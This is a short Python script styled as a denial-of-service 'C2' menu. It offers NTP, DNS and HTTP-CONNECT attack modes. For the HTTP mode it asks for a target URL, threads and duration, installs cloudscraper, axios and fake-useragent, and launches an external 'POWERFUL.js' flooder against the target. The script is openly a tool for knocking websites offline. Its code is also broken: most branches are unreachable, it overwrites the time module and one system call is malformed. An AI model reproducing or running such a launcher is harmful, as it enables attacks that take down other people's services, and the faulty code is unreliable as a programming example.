import time
import os
import socket
import string
percent = "%"
power = "100%" ##randomstring 100,99,50,30,10 try randomstring(json.random) +percent
vip = "true"
##main
os.system("clear")
time.sleep(3)
print("Welcome!")
print("The Power is "+power)
print("Online = 1")
time.sleep(2)

cmd = input("CofzzC2 >> ")

if cmd=="layer4":
    os.system("clear")
    time.sleep(1)
    print("Layer4 Methods : NTP , DNS (V1)")
    
    cmd = input("CofzzC2 >> ")
    
    if cmd=="layer7":
        os.system("clear")
        time.sleep(2)
        print("Layer7 Methods : HTTP-CONNECT (OP)")
        
        cmd = input("CofzzC2 >> ")
        
        if cmd=="HTTP-CONNECT":
            os.system("clear")
            time.sleep(1)
            targt = input("Url >> ")
            thrds = input("Threads >> ")
            time = input("Time 25) Max >> ")
            os.system("npm i cloudscraper")
            os.system("npm i axios")
            os.system("npm i fake-useragent")
            os.system("node POWERFUL.js"+targt) ("1000 25")
            time.sleep(4)
            print("Attacking" +targt)
            time.sleep(61)
            print("Done!")
            os.system("clear")
            os.system("exit")
            
            if cmd=="NTP":
                os.system("clear")
                time.sleep(2)
                ip = input("Ip >> ")
                port = input("Port (80/3389) >> ")
                time2 = input("Time >> ")
                time.sleep(2)
                print("Attacking" +ip)
                time.sleep(time)
                
            if cmd=="DNS":
                os.system("clear")
                time.sleep(2)
                ip2 = input("Ip >> ")
                port2 = input("Port (80/3389) >> ")
                time3 = input("Time >> ")
                time.sleep(2)
                print("Attacking" +ip2)
                time.sleep(time3)